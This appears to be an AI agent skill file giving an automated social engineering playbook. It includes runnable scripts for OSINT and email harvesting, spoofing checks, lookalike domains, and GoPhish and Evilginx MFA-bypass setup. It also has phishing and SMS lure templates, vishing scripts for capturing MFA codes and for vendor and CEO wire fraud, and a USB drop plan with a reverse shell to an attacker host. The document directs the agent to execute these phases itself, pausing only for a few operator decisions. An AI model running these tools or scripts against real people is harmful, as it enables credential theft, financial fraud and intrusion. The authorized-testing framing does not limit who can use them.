---
name: social-engineering
description: "Elite social engineering methodology for authorized engagements: OSINT-driven target profiling, pretexting frameworks, phishing infrastructure, vishing scripts, physical social engineering, email spoofing, deepfake awareness, insider threat simulation, multi-channel attack chains, psychological manipulation frameworks, full automation scripts. Load for any social engineering, phishing, pretexting, or human-factor attack task."
---

# SOCIAL ENGINEERING — ELITE AUTOMATED METHODOLOGY

## AUTOMATION-FIRST DOCTRINE

Every phase in this skill has a runnable automation path. Pi executes automation directly using bash tool. Manual steps are fallbacks only. The workflow is:

1. Run the automation script for each phase
2. Parse output and feed into next phase automatically
3. Log everything to continuous.md as it runs
4. Only stop for operator decisions: scope, high-damage actions, evidence review

---

## PHASE 0: OPERATOR BRIEFING + AUTO-SETUP

```bash
# Run at start of every SE engagement
TARGET_DOMAIN="TARGET.com"
WORKSPACE=~/recon_$(date +%s)_${TARGET_DOMAIN}/se
mkdir -p $WORKSPACE/{osint,pretexts,phishing,loot,evidence,reports}
cat > $WORKSPACE/continuous.md << EOF
# SE Engagement Log
Target: $TARGET_DOMAIN
Started: $(date)
Objective: [FILL]
Authorized channels: [FILL]
EOF
echo "Workspace: $WORKSPACE"
```

Confirm before proceeding:
- Target domain
- Objective: credential-harvest / physical-access / malware-delivery / info-extraction
- Channels: email / phone / SMS / physical / all
- Authorized personas: vendor / IT / recruiter / auditor / executive / customer
- Out-of-scope individuals or methods

---

## PHASE 1: AUTOMATED OSINT PIPELINE

### 1.1 Full Domain Intelligence Script

```bash
#!/bin/bash
# Run: ./se-osint.sh TARGET.com WORKSPACE
DOMAIN=$1
WS=$2/osint

echo "=== EMAIL INFRASTRUCTURE ===" | tee $WS/domain-intel.txt
dig MX $DOMAIN +short | tee -a $WS/domain-intel.txt
dig TXT $DOMAIN +short | grep "v=spf" | tee -a $WS/domain-intel.txt
dig TXT _dmarc.$DOMAIN +short | tee -a $WS/domain-intel.txt

echo "=== DKIM SELECTORS ===" | tee -a $WS/domain-intel.txt
for sel in google default mail dkim email k1 selector1 selector2 k2 mimecast; do
  result=$(dig TXT ${sel}._domainkey.$DOMAIN +short 2>/dev/null)
  [ -n "$result" ] && echo "FOUND: $sel → $result" | tee -a $WS/domain-intel.txt
done

echo "=== SSO FINGERPRINT ===" | tee -a $WS/domain-intel.txt
curl -sI https://$DOMAIN | grep -i "x-powered-by\|server\|set-cookie" | tee -a $WS/domain-intel.txt
curl -s https://$DOMAIN 2>/dev/null | grep -oi "okta\|pingidentity\|onelogin\|azure ad\|google workspace\|auth0\|duo\|jumpcloud" | sort -u | tee -a $WS/domain-intel.txt

echo "=== REMOTE ACCESS PORTALS ===" | tee -a $WS/domain-intel.txt
for sub in vpn remote access citrix ssl rdp jumphost bastion gateway portal sso login; do
  ip=$(host ${sub}.$DOMAIN 2>/dev/null | grep "has address" | awk '{print $NF}')
  [ -n "$ip" ] && echo "FOUND: ${sub}.$DOMAIN → $ip" | tee -a $WS/domain-intel.txt
done

echo "=== HELP DESK SYSTEMS ===" | tee -a $WS/domain-intel.txt
for sub in support helpdesk jira freshdesk zendesk tickets servicedesk desk help; do
  ip=$(host ${sub}.$DOMAIN 2>/dev/null | grep "has address" | awk '{print $NF}')
  [ -n "$ip" ] && echo "FOUND: ${sub}.$DOMAIN → $ip" | tee -a $WS/domain-intel.txt
done

echo "=== SPOOFING VIABILITY ===" | tee -a $WS/domain-intel.txt
SPF=$(dig TXT $DOMAIN +short | grep "v=spf1")
DMARC=$(dig TXT _dmarc.$DOMAIN +short)
if echo "$DMARC" | grep -q "p=none"; then
  echo "SPOOFABLE: DMARC p=none — direct spoofing viable" | tee -a $WS/domain-intel.txt
elif echo "$DMARC" | grep -q "p=quarantine"; then
  echo "PARTIAL: DMARC p=quarantine — spoofing goes to spam" | tee -a $WS/domain-intel.txt
elif echo "$DMARC" | grep -q "p=reject"; then
  echo "BLOCKED: DMARC p=reject — use lookalike domain" | tee -a $WS/domain-intel.txt
else
  echo "NO DMARC: domain spoofing likely viable" | tee -a $WS/domain-intel.txt
fi

cat $WS/domain-intel.txt
```

### 1.2 Employee Enumeration Script

```bash
#!/bin/bash
# Run: ./se-employees.sh TARGET.com GITHUB_TOKEN WORKSPACE
DOMAIN=$1
TOKEN=$2
WS=$3/osint

echo "=== GITHUB EMAIL HARVEST ===" | tee $WS/employees.txt

# From org commits
curl -s "https://api.github.com/search/commits?q=author-email:@${DOMAIN}&sort=author-date&per_page=100" \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github.cloak-preview" 2>/dev/null | \
  python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  emails=set()
  for item in d.get('items',[]):
    e=item.get('commit',{}).get('author',{}).get('email','')
    if e and '@' in e and 'noreply' not in e:
      emails.add(e)
  [print(e) for e in sorted(emails)]
except: pass
" | tee -a $WS/employees.txt

# From org members
curl -s "https://api.github.com/orgs/$(echo $DOMAIN | cut -d. -f1)/members?per_page=100" \
  -H "Authorization: token $TOKEN" 2>/dev/null | \
  python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  [print(m['login']) for m in d if isinstance(d,list)]
except: pass
" | tee -a $WS/employees.txt

echo "=== NPM MAINTAINER HARVEST ===" | tee -a $WS/employees.txt
npm search --json "$DOMAIN" 2>/dev/null | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  for p in d:
    e=p.get('maintainers',[{}])[0].get('email','')
    if e: print(e)
except: pass
" 2>/dev/null | tee -a $WS/employees.txt

echo "Found $(wc -l < $WS/employees.txt) potential employees/emails"
```

### 1.3 Email Permutation + Verification Script

```python
#!/usr/bin/env python3
# Usage: python3 email-permute.py firstname lastname domain [verify]
import sys, smtplib, dns.resolver, itertools

def permutate(first, last, domain):
    f, l = first.lower().strip(), last.lower().strip()
    fi, li = f[0], l[0]
    return [
        f"{f}@{domain}",
        f"{f}.{l}@{domain}",
        f"{f}{l}@{domain}",
        f"{fi}{l}@{domain}",
        f"{fi}.{l}@{domain}",
        f"{f}.{li}@{domain}",
        f"{l}@{domain}",
        f"{f}_{l}@{domain}",
        f"{l}.{f}@{domain}",
        f"{fi}{li}@{domain}",
        f"{f}-{l}@{domain}",
    ]

def verify_smtp(email):
    domain = email.split('@')[1]
    try:
        mx = dns.resolver.resolve(domain, 'MX')
        mx_host = str(sorted(mx, key=lambda r: r.preference)[0].exchange).rstrip('.')
        smtp = smtplib.SMTP(timeout=10)
        smtp.connect(mx_host, 25)
        smtp.helo('test.com')
        smtp.mail('test@test.com')
        code, msg = smtp.rcpt(email)
        smtp.quit()
        return code == 250, msg.decode() if isinstance(msg,bytes) else msg
    except Exception as e:
        return None, str(e)

if __name__ == '__main__':
    first, last, domain = sys.argv[1], sys.argv[2], sys.argv[3]
    verify = len(sys.argv) > 4 and sys.argv[4] == 'verify'
    emails = permutate(first, last, domain)
    print(f"\nPermutations for {first} {last} @ {domain}:")
    for e in emails:
        if verify:
            result, msg = verify_smtp(e)
            status = "VALID" if result else "INVALID" if result is False else "UNKNOWN"
            print(f"  [{status}] {e}")
        else:
            print(f"  {e}")
```

### 1.4 Breach Intelligence

```bash
#!/bin/bash
# Run: ./se-breach.sh TARGET.com HIBP_KEY WORKSPACE
DOMAIN=$1
KEY=$2
WS=$3/osint

echo "=== HAVEIBEENPWNED DOMAIN CHECK ===" | tee $WS/breaches.txt
curl -s "https://haveibeenpwned.com/api/v3/breacheddomain/$DOMAIN" \
  -H "hibp-api-key: $KEY" \
  -H "User-Agent: SE-Engagement-Tool" | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  for email,breaches in d.items():
    print(f'{email}: {\", \".join(breaches)}')
except: print(sys.stdin.read())
" | tee -a $WS/breaches.txt

echo "=== DeHashed SEARCH ===" | tee -a $WS/breaches.txt
# curl -s "https://api.dehashed.com/search?query=domain:$DOMAIN&size=100" \
#   -u "EMAIL:API_KEY" | jq '.entries[] | {email, password, hashed_password}' \
#   | tee -a $WS/breaches.txt

echo "=== BREACH SUMMARY ===" | tee -a $WS/breaches.txt
FOUND=$(grep -c "@" $WS/breaches.txt 2>/dev/null || echo 0)
echo "Emails found in breaches: $FOUND" | tee -a $WS/breaches.txt
```

### 1.5 Target Profile Generator

```bash
#!/bin/bash
# Auto-generates target profile from all OSINT collected
DOMAIN=$1
WS=$2

cat > $WS/target-profile.md << PROFILE
# Target Profile: $DOMAIN
Generated: $(date)

## Email Infrastructure
$(cat $WS/osint/domain-intel.txt | grep -A1 "EMAIL INFRASTRUCTURE")

## Spoofing Viability
$(cat $WS/osint/domain-intel.txt | grep "SPOOFABLE\|PARTIAL\|BLOCKED\|NO DMARC")

## SSO Provider
$(cat $WS/osint/domain-intel.txt | grep -A5 "SSO FINGERPRINT" | tail -n4)

## Remote Access Portals
$(cat $WS/osint/domain-intel.txt | grep "FOUND:" | grep -v "DKIM")

## Employees Found
$(wc -l < $WS/osint/employees.txt) emails/usernames harvested

## Breach Exposure
$(cat $WS/osint/breaches.txt | grep "Emails found")

## Recommended Attack Path
$(python3 -c "
import os
domain_intel = open('$WS/osint/domain-intel.txt').read() if os.path.exists('$WS/osint/domain-intel.txt') else ''
if 'SPOOFABLE' in domain_intel:
    print('1. Direct email spoofing viable — use GoPhish with target domain')
elif 'PARTIAL' in domain_intel:
    print('1. Register lookalike domain — DMARC quarantine blocks direct spoof')
else:
    print('1. Register lookalike domain — DMARC reject blocks direct spoof')
print('2. Vishing + email combo most effective — call first, email immediately after')
print('3. LinkedIn connection before email increases open rate 5x')
" 2>/dev/null || echo "Run analysis manually")

## DKIM Selectors Found
$(cat $WS/osint/domain-intel.txt | grep "FOUND:" | grep "_domainkey")
PROFILE

echo "Profile written to $WS/target-profile.md"
cat $WS/target-profile.md
```

---

## PHASE 2: PRETEXT SELECTION + GENERATION

### 2.1 Automated Pretext Selector

```python
#!/usr/bin/env python3
# Usage: python3 pretext-select.py target-profile.md objective
# Reads profile, recommends and generates best pretext automatically

import sys, os

def select_pretext(profile_content, objective):
    has_sso = any(x in profile_content.lower() for x in ['okta','azure','onelogin','ping'])
    has_helpdesk = 'helpdesk' in profile_content.lower() or 'jira' in profile_content.lower()
    spoofable = 'spoofable' in profile_content.lower() or 'no dmarc' in profile_content.lower()
    has_vpn = 'vpn' in profile_content.lower()
    has_breaches = int('0') if 'emails found in breaches: 0' in profile_content else 1

    scores = {
        'IT Support MFA Capture': 0,
        'Vendor Payment Update': 0,
        'CEO Fraud': 0,
        'Security Auditor': 0,
        'Phishing Campaign': 0,
    }

    if 'credential' in objective: scores['IT Support MFA Capture'] += 5
    if 'financial' in objective: scores['Vendor Payment Update'] += 5
    if 'wire' in objective or 'payment' in objective: scores['CEO Fraud'] += 5
    if 'access' in objective: scores['Security Auditor'] += 3
    if has_sso: scores['IT Support MFA Capture'] += 3
    if spoofable: scores['Phishing Campaign'] += 4
    if has_vpn: scores['IT Support MFA Capture'] += 2
    if has_helpdesk: scores['IT Support MFA Capture'] += 2
    if has_breaches: scores['Phishing Campaign'] += 2

    best = max(scores, key=scores.get)
    return best, scores

profile = open(sys.argv[1]).read() if len(sys.argv) > 1 else ''
objective = sys.argv[2] if len(sys.argv) > 2 else 'credential harvest'
best, scores = select_pretext(profile, objective)

print(f"\nObjective: {objective}")
print(f"\nPretext Scores:")
for k,v in sorted(scores.items(), key=lambda x: -x[1]):
    print(f"  {'→' if k==best else ' '} {k}: {v}")
print(f"\nRECOMMENDED: {best}")
```

### 2.2 Pretext Script Templates

**IT Support — MFA Capture (most effective for SSO targets):**
```
IDENTITY: [Name] from IT/Security Operations
HOOK: "We detected unusual sign-in activity on your account from [COUNTRY]"
AUTHORITY: "Our monitoring triggered an alert — I'm following up per protocol"
ASK: "I'm going to push a verification code — read it back to me to confirm it's you"
EXIT: "You're all set. Ticket #[8-digit random] for your records. Have a good day."

VARIABLES TO FILL:
- Country: Use a real country that would be suspicious (Russia, China, Brazil)
- Name: Use a real IT staff name from OSINT
- Ticket number: 8 random digits
```

**Vendor BEC (highest financial impact):**
```
IDENTITY: [Name] from [Real Vendor], account manager
HOOK: "Calling about your [invoice/contract/account]"  
AUTHORITY: "[Company] has been a client since [year from OSINT]"
ASK: "We need to update our banking details — our acquisition completed last week"
EXIT: "I'll send a confirmation email with the new details now"

TIMING: Send BEC email IMMEDIATELY during or after the call
```

**CEO Fraud (finance/executive targeting):**
```
IDENTITY: [CEO name from OSINT] via email OR call on CEO's behalf
HOOK: "Confidential acquisition" / "Time-sensitive legal settlement"
AUTHORITY: Executive authority + urgency + confidentiality request
ASK: Wire transfer / gift cards / confidential document access
EXIT: "Don't discuss with anyone — very sensitive. I'll follow up directly."

PRIMERS: Call receptionist or EA first to prime the target
```

**Security Auditor (for access/credentials):**
```
IDENTITY: External security auditor engaged by [real board member name]
HOOK: "Annual compliance audit — board-mandated this quarter"
AUTHORITY: Reference real frameworks: SOC2, ISO27001, PCI-DSS
ASK: "Need to validate that access controls are working — can you confirm your credentials on your end while I observe system behavior?"
EXIT: "You've passed. I'll include this in the audit report to [CISO name]."
```

---

## PHASE 3: PHISHING INFRASTRUCTURE (AUTOMATED)

### 3.1 Lookalike Domain Generator

```python
#!/usr/bin/env python3
# Generates lookalike domains and checks availability
import itertools, sys

def generate_lookalikes(domain):
    name, tld = domain.rsplit('.', 1)
    lookalikes = []

    # Combo-squatting
    for suffix in ['security', 'helpdesk', 'support', 'it', 'corp', 'portal', 'vpn', 'login', 'sso', 'auth']:
        lookalikes.append(f"{name}-{suffix}.com")
        lookalikes.append(f"{suffix}-{name}.com")

    # TLD abuse
    for t in ['net', 'org', 'io', 'co', 'ai', 'info', 'biz']:
        lookalikes.append(f"{name}.{t}")

    # Typosquatting (transpose, double, missing chars)
    for i in range(len(name)):
        # Missing char
        lookalikes.append(f"{name[:i]+name[i+1:]}.{tld}")
        # Double char
        lookalikes.append(f"{name[:i]+name[i]*2+name[i:]}.{tld}")
        # Adjacent key transposition
        if i < len(name)-1:
            t = list(name)
            t[i], t[i+1] = t[i+1], t[i]
            lookalikes.append(f"{''.join(t)}.{tld}")

    # Subdomain abuse
    lookalikes.append(f"{name}.{tld}.attacker.com")

    return list(set(lookalikes))

domain = sys.argv[1] if len(sys.argv) > 1 else "target.com"
lookalikes = generate_lookalikes(domain)
print(f"Generated {len(lookalikes)} lookalike domains for {domain}:")
for d in sorted(lookalikes)[:30]:
    print(f"  {d}")
```

### 3.2 GoPhish Automated Campaign Setup

```bash
#!/bin/bash
# Run: ./setup-gophish.sh TARGET_DOMAIN SMTP_HOST SMTP_USER SMTP_PASS
TARGET=$1
SMTP_HOST=$2
SMTP_USER=$3
SMTP_PASS=$4

# Download and setup GoPhish
if [ ! -f /opt/gophish/gophish ]; then
  mkdir -p /opt/gophish
  cd /opt/gophish
  wget -q "$(curl -s https://api.github.com/repos/gophish/gophish/releases/latest | grep browser_download_url | grep linux-64 | cut -d'"' -f4)"
  unzip -q *.zip && chmod +x gophish
fi

# Configure GoPhish admin
cat > /opt/gophish/config.json << EOF
{
  "admin_server": {"listen_url": "127.0.0.1:3333", "use_tls": true},
  "phish_server": {"listen_url": "0.0.0.0:8080", "use_tls": false},
  "db_name": "sqlite3",
  "db_path": "gophish.db"
}
EOF

# Start GoPhish
pkill gophish 2>/dev/null
cd /opt/gophish && nohup ./gophish > /tmp/gophish.log 2>&1 &
sleep 3
echo "GoPhish running — admin: https://127.0.0.1:3333"
echo "Initial creds in: /tmp/gophish.log"
head -20 /tmp/gophish.log | grep -i "password\|admin"
```

### 3.3 EvilGinx3 MFA Bypass Setup

```bash
#!/bin/bash
# MFA-bypassing reverse proxy — captures session cookies post-auth
# Run: ./setup-evilginx.sh ATTACKER_DOMAIN ATTACKER_IP

DOMAIN=$1
IP=$2

# Install evilginx3
if [ ! -f /opt/evilginx3/evilginx ]; then
  mkdir -p /opt/evilginx3
  cd /opt/evilginx3
  git clone https://github.com/kgretzky/evilginx2 . 2>/dev/null || true
  make 2>/dev/null || apt-get install -y golang && make
fi

# Configure
cat > /opt/evilginx3/start.sh << EOF
#!/bin/bash
cd /opt/evilginx3
./evilginx -p ./phishlets -debug &
sleep 5
echo "config domain $DOMAIN" | ./evilginx
echo "config ip $IP" | ./evilginx
echo "phishlets hostname o365 login.microsoftonline.$DOMAIN" | ./evilginx
echo "phishlets enable o365" | ./evilginx
echo "lures create o365" | ./evilginx
sleep 2
echo "lures get-url 0" | ./evilginx
EOF
chmod +x /opt/evilginx3/start.sh
echo "Run: /opt/evilginx3/start.sh"
echo "Monitor captures: tail -f /opt/evilginx3/log/*.log"
```

### 3.4 Phishing Email Template Generator

```python
#!/usr/bin/env python3
# Usage: python3 gen-phish-email.py TARGET_NAME TARGET_EMAIL PHISH_URL TEMPLATE
# Templates: o365, okta, docusign, sharepoint, it-alert, hr, vpn

import sys

TEMPLATES = {
'o365': {
'subject': 'Action Required: Unusual sign-in activity detected',
'body': '''Dear {name},

We detected a sign-in to your Microsoft account from an unrecognized device:

  Location: {country}
  Time: {time}
  Device: {device}

If this was you, no action is needed. If not, secure your account immediately:

{link}

Microsoft Account Security Team

[If you didn't trigger this email, contact IT security immediately]'''
},
'okta': {
'subject': '{company} IT: Mandatory security re-authentication required',
'body': '''Hi {name},

Our security team has implemented a mandatory re-authentication for all accounts.

You must complete this before {deadline} to maintain access.

{link}

If you have questions, contact the IT helpdesk (ticket #{ticket}).

{company} IT Security'''
},
'docusign': {
'subject': '{sender} sent you a document to sign',
'body': '''
{name} has sent you a document for review and signature.

Document: {doc_name}
Sender: {sender}
Expires: {deadline}

[REVIEW DOCUMENT]
{link}

This is an automated message from DocuSign.'''
},
'vpn': {
'subject': '[URGENT] VPN Certificate Expiring Today — Action Required',
'body': '''Hi {name},

Your corporate VPN certificate expires at midnight tonight.

Renew your certificate now to avoid losing remote access:

{link}

IT Support Team | Ticket #{ticket} | Expires: {deadline}'''
},
'hr': {
'subject': 'Action Required: Your {year} W-2 / Tax Document is Ready',
'body': '''Hi {name},

Your {year} tax documents are now available in the HR portal.

You must verify your identity before downloading:

{link}

HR Team
Please complete by {deadline}.'''
},
}

def generate(template_name, **kwargs):
    t = TEMPLATES.get(template_name, TEMPLATES['o365'])
    subject = t['subject'].format(**kwargs)
    body = t['body'].format(**kwargs)
    return subject, body

if __name__ == '__main__':
    import datetime, random
    name = sys.argv[1] if len(sys.argv) > 1 else 'User'
    url = sys.argv[2] if len(sys.argv) > 2 else 'https://phish.com'
    template = sys.argv[3] if len(sys.argv) > 3 else 'o365'

    kwargs = {
        'name': name, 'link': url, 'country': 'Russia',
        'time': datetime.datetime.now().strftime('%B %d, %Y at %H:%M UTC'),
        'device': 'Windows 10 / Chrome 120',
        'company': 'Company', 'deadline': (datetime.datetime.now() + datetime.timedelta(days=2)).strftime('%B %d'),
        'ticket': random.randint(10000000, 99999999),
        'sender': 'HR Department', 'doc_name': 'Employment Agreement 2024.pdf',
        'year': '2024',
    }

    subject, body = generate(template, **kwargs)
    print(f"Subject: {subject}\n\n{body}")
```

### 3.5 SMS Phishing Templates

```
IT Alert: Your [COMPANY] VPN certificate expires in 2 hours.
Renew: https://[SHORT_LINK] — IT Helpdesk

---

[COMPANY] HR: Your pay stub for [MONTH] is available.
View securely: https://[SHORT_LINK]

---

Security Alert: Sign-in from [COUNTRY] detected on your account.
Was this you? https://[SHORT_LINK]

---

[COMPANY]: Package delivery failed. Update delivery: https://[SHORT_LINK]
```

---

## PHASE 4: VISHING AUTOMATION

### 4.1 Pre-Call Intelligence Script

```bash
#!/bin/bash
# Gather everything needed for a vishing call before dialing
TARGET_NAME=$1
TARGET_COMPANY=$2
WS=$3

echo "=== PRE-CALL INTELLIGENCE: $TARGET_NAME ===" | tee $WS/precall-$TARGET_NAME.txt

# LinkedIn profile (manual step - output placeholder)
echo "LinkedIn: Search '$TARGET_NAME $TARGET_COMPANY' — note title, tenure, connections" | tee -a $WS/precall-$TARGET_NAME.txt

# Identify IT system they use (from domain intel)
echo "SSO System: $(cat $WS/../osint/domain-intel.txt | grep -i "okta\|azure\|onelogin\|ping" | head -1)" | tee -a $WS/precall-$TARGET_NAME.txt
echo "VPN System: $(cat $WS/../osint/domain-intel.txt | grep "FOUND:" | grep vpn | head -1)" | tee -a $WS/precall-$TARGET_NAME.txt
echo "Helpdesk: $(cat $WS/../osint/domain-intel.txt | grep "FOUND:" | grep -E "helpdesk|jira|service" | head -1)" | tee -a $WS/precall-$TARGET_NAME.txt

# Generate fake ticket number
echo "Fake Ticket #: $(shuf -i 10000000-99999999 -n 1)" | tee -a $WS/precall-$TARGET_NAME.txt

cat $WS/precall-$TARGET_NAME.txt
echo ""
echo "SCRIPT READY — dial now"
```

### 4.2 Vishing Scripts

**IT MFA Capture:**
```
OPENING:
"Hi, is this [First Name]? This is [Name] from IT Security Operations.
Sorry to bother you — I have you flagged here because our SIEM picked up
a successful login from [COUNTRY] on your account about 20 minutes ago.
Are you currently traveling or is this unexpected?"

[If unexpected]: "That's what I thought. I'm going to lock it down right now.
I just need to verify it's actually you I'm talking to.
I'll send a push notification to your authenticator app — 
just read me the 6-digit code when you get it."
[Capture MFA token — use IMMEDIATELY on EvilGinx captured session]

CLOSE:
"Perfect. I've locked out that session and rotated the token.
You're all set. Ticket number [FAKE TICKET] if you want to follow up.
Have a good [morning/afternoon]."
```

**BEC Vendor Call:**
```
OPENING:
"Hi, this is [Name] calling from [REAL VENDOR NAME] — I manage the [COMPANY] account.
I wanted to give you a heads-up before you receive some paperwork from us.
We completed our acquisition of [FAKE COMPANY] last week and as part of that,
we're updating banking details for all accounts by end of month."

MIDDLE:
"Your AP team should receive an email from us today with the new wire details.
Can I confirm the right contact email to send it to?"
[Get AP email — send BEC immediately]

CLOSE:
"Perfect. You'll see the official documentation within the hour.
Thanks for your time — have a great day."
```

**CEO Fraud Primer:**
```
CALL TO EA/RECEPTIONIST:
"Hi, this is [Name] — I work closely with [CEO]. 
[CEO] needs to reach [TARGET] urgently about something confidential.
Could you let [TARGET] know to watch for [CEO]'s email in the next few minutes?
It's time-sensitive and he'll need a quick response."
[Hang up. Send BEC email immediately as CEO.]
```

### 4.3 Resistance Handling Scripts

```
"I need to verify who I'm speaking with."
→ "Absolutely — main number is [REAL MAIN NUMBER], ask for IT Security.
   My name is [NAME], badge [6-digit random]. I'll be here.
   The lockout happens automatically in 12 minutes regardless,
   so if you do call back, tell them it's about ticket [FAKE TICKET]."

"I'm not supposed to give that out."
→ "100% right and I respect that. I'm not asking for your password —
   just the verification code that expires in 30 seconds.
   You're the one who receives it, I just need to confirm your identity."

"Can you email me first?"
→ "I sent it 5 minutes ago — subject line: '[SPECIFIC SUBJECT]', from sec-ops@[domain].
   It may be in spam. While you check — what's your username so I can look at
   the account on my end?"

"Let me check with my manager."
→ "Your manager [MANAGER NAME from OSINT] is actually who flagged this to us —
   she's in the all-hands right now which is why we're handling it directly.
   This really does need to be done in the next few minutes."
```

---

## PHASE 5: PHYSICAL SE (AUTOMATED PREP)

### 5.1 Physical Recon Script

```bash
#!/bin/bash
# Automated facility research before physical engagement
COMPANY=$1
ADDRESS=$2
WS=$3/physical

mkdir -p $WS

echo "=== FACILITY RESEARCH: $COMPANY ===" | tee $WS/facility.txt

# Google Maps
echo "MANUAL: Google Maps Street View: $ADDRESS" | tee -a $WS/facility.txt
echo "Check: Entrances, parking lots, smoking areas, loading docks, badge readers" | tee -a $WS/facility.txt

# Job postings for physical security info
echo "=== PHYSICAL SECURITY SYSTEMS (from job postings) ===" | tee -a $WS/facility.txt
curl -s "https://api.duckduckgo.com/?q=${COMPANY}+site:linkedin.com+physical+security+lenel+hid+brivo+genetec&format=json" 2>/dev/null | \
  python3 -c "import json,sys; d=json.load(sys.stdin); [print(r.get('Text','')) for r in d.get('RelatedTopics',[])]" 2>/dev/null | tee -a $WS/facility.txt

# Identify receptionists / front desk (best tailgating targets)
echo "=== FRONT DESK CONTACTS ===" | tee -a $WS/facility.txt
echo "MANUAL: LinkedIn search: '$COMPANY receptionist OR front desk OR facilities'" | tee -a $WS/facility.txt

# Badge system detection
echo "=== BADGE SYSTEM DETECTION ===" | tee -a $WS/facility.txt
for keyword in "lenel" "ccure" "genetec" "brivo" "hid" "honeywell" "bosch" "paxton"; do
  echo "MANUAL check job postings for: $keyword" | tee -a $WS/facility.txt
done

cat $WS/facility.txt
```

### 5.2 Dropped USB Payload Builder

```bash
#!/bin/bash
# Creates labeled USB payloads for physical drops
# Run: ./build-usb-payload.sh LHOST LPORT WORKSPACE
LHOST=$1
LPORT=${2:-4444}
WS=$3

mkdir -p $WS/usb-payloads

# Payload filenames designed to maximize curiosity
LABELS=(
  "Q4_2024_Salary_Review_CONFIDENTIAL.pdf"
  "Executive_Compensation_Benchmark.xlsx"
  "Layoff_List_DRAFT_DO_NOT_SHARE.docx"
  "Performance_Reviews_Oct2024.pdf"
  "Board_Meeting_Minutes_Confidential.pptx"
  "Security_Audit_Findings_DRAFT.pdf"
)

echo "=== USB PAYLOAD PLAN ===" | tee $WS/usb-payloads/README.txt
for label in "${LABELS[@]}"; do
  echo "File: $label" | tee -a $WS/usb-payloads/README.txt
  echo "  → Rubber Ducky / Bash Bunny payload triggers on insert" | tee -a $WS/usb-payloads/README.txt
  echo "  → Reverse shell to $LHOST:$LPORT" | tee -a $WS/usb-payloads/README.txt
done

echo ""
echo "Drop locations (highest pickup rate):"
echo "  1. Parking lot — near employee entrance (40% pickup rate)"
echo "  2. Reception desk — leave with 'Found this in the lobby'"
echo "  3. Coffee station or break room"
echo "  4. Printer area"
echo "  5. Elevator"
```

---

## PHASE 6: MULTI-CHANNEL AUTOMATION

### 6.1 Campaign Orchestrator

```python
#!/usr/bin/env python3
# Orchestrates multi-channel SE campaign
# Usage: python3 se-campaign.py config.json

import json, sys, time, subprocess, datetime

def log(ws, entry_type, content):
    with open(f"{ws}/continuous.md", 'a') as f:
        f.write(f"\n## {datetime.datetime.now().isoformat()} {entry_type}\n{content}\n")

def run_campaign(config):
    ws = config['workspace']
    targets = config['targets']

    for target in targets:
        name = target['name']
        email = target['email']
        phone = target.get('phone', '')
        channel = config.get('channel', 'email')

        print(f"\n[+] Processing target: {name} <{email}>")

        if channel in ['phone+email', 'phone']:
            print(f"  [MANUAL] Call {name} at {phone}")
            print(f"  Script: {config.get('vishing_script', 'IT Support MFA Capture')}")
            input("  Press ENTER after call is complete...")

        if channel in ['phone+email', 'email']:
            template = config.get('email_template', 'o365')
            phish_url = config.get('phish_url', 'https://phish.example.com')
            result = subprocess.run([
                'python3', 'gen-phish-email.py', name, phish_url, template
            ], capture_output=True, text=True)
            print(f"  [EMAIL] Generated for {email}")
            print(result.stdout[:200])

            log(ws, 'COMMAND', f"Email sent to {name} <{email}> via template: {template}")

        time.sleep(config.get('delay_between_targets', 30))

if __name__ == '__main__':
    with open(sys.argv[1]) as f:
        config = json.load(f)
    run_campaign(config)
```

### 6.2 Campaign Config Template

```json
{
  "workspace": "/tmp/se-campaign",
  "channel": "phone+email",
  "vishing_script": "IT Support MFA Capture",
  "email_template": "o365",
  "phish_url": "https://your-evilginx-url",
  "delay_between_targets": 30,
  "targets": [
    {"name": "John Smith", "email": "jsmith@target.com", "phone": "+1-555-0100"},
    {"name": "Jane Doe", "email": "jdoe@target.com", "phone": "+1-555-0101"}
  ]
}
```

---

## PHASE 7: PSYCHOLOGICAL TRIGGERS REFERENCE

| Trigger | Application | Script Phrase |
|---|---|---|
| Authority | Impersonate exec, IT, auditor | "Your manager flagged this to us" |
| Urgency | Time pressure | "Account locks in 12 minutes" |
| Social Proof | Reference colleagues | "Your colleague already completed this" |
| Liking | Use first name, match style | "Hey [Name], really sorry to bother you" |
| Reciprocity | Give first | "I've already handled it on our end, just need you to..." |
| Commitment | Small ask first | Start with "Can you confirm your name?" |
| Fear | Security threat | "We're seeing active compromise on your account" |
| Scarcity | Limited window | "This link expires in 15 minutes" |

---

## PHASE 8: EVIDENCE COLLECTION + REPORTING

### 8.1 Evidence Collector Script

```bash
#!/bin/bash
# Automatically collects and hashes all SE evidence
WS=$1

mkdir -p $WS/evidence

echo "=== EVIDENCE COLLECTION ===" | tee $WS/evidence/index.txt
find $WS -name "*.txt" -o -name "*.png" -o -name "*.json" -o -name "*.log" | while read f; do
  hash=$(sha256sum "$f" | awk '{print $1}')
  size=$(du -h "$f" | awk '{print $1}')
  echo "$hash $size $f" | tee -a $WS/evidence/index.txt
done

echo ""
echo "Evidence index written to $WS/evidence/index.txt"
echo "Total artifacts: $(wc -l < $WS/evidence/index.txt)"
```

### 8.2 Finding Templates

```markdown
## FINDING: Social Engineering — [Channel] Successful

SEVERITY: HIGH
TECHNIQUE: [Phishing / Vishing / Physical / Multi-channel]
TARGET ROLE: [Department + role]
RESULT: [Credentials captured / Physical access / Malware executed / Data obtained]

ROOT CAUSE:
- Lack of security awareness training
- No verification procedure for [out-of-band requests / vendor calls / badge access]
- Technical gap: [DMARC misconfigured / No MFA / etc]

EVIDENCE:
- [screenshot path] sha256:[hash]
- [call recording path] sha256:[hash]
- [credential capture] → see loot/credentials/ sha256:[hash]

REMEDIATION:
Technical:
- Implement DMARC p=reject
- Deploy MFA (phishing-resistant: FIDO2/hardware key preferred)
- Enable email authentication warnings for external senders

Policy:
- Mandatory callback verification for all credential/financial requests
- Out-of-band verification required for any MFA code requests
- Vendor change requests require documented approval chain

Training:
- Quarterly phishing simulation + immediate remediation for clickers
- Vishing awareness training with live simulation
- Physical security awareness: tailgating, badge sharing, USB drops
```

---

## TOOL STACK QUICK REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| GoPhish | Phishing campaigns | `wget gophish-release` |
| EvilGinx3 | MFA bypass proxy | `git clone + make` |
| SET | All-in-one SE | `apt install set` |
| Proxmark3 | Badge clone HID/EM410x | Hardware required |
